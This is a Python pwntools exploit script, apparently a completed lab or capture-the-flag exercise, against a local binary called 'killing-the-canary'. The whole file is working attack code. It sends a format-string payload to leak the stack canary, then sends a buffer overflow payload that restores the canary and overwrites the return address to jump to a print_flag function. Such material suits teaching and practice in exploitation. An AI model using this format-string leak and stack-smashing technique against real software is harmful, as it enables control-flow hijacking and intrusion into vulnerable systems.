#!/usr/bin/env python3
import re
from pwn import *

exe = ELF("./killing-the-canary")

r = process([exe.path])
# gdb.attach(r)

r.recvuntil(b"What's your name? ")
# Canary is 0x68 == 13 8-bytes above $rsp; 14th byte is the canary
# Add 5 for the 5 non-stack args that printf will consume
r.sendline(b"%19$lu") #Add your code here

val = r.recvuntil(b"What's your message? ")
# log.info(val)
canary = int(re.match(b"Hello, ([0-9]+)\n!.*", val).groups()[0])
log.info(f"Canary: {canary:x}")

win = exe.symbols['print_flag']
# log.info(hex(win))

# This payload gets saved in the buffer message
# message is 0x50 below $rbp, while canary is 0x8 below $rbp
# Fill 0x48, then canary, then saved $rbp, then return address p64(win)
payload = b"A" * 72 + p64(canary) + b"B" * 8 + p64(win) # Add your payload here
r.sendline(payload)

r.recvline()
r.interactive()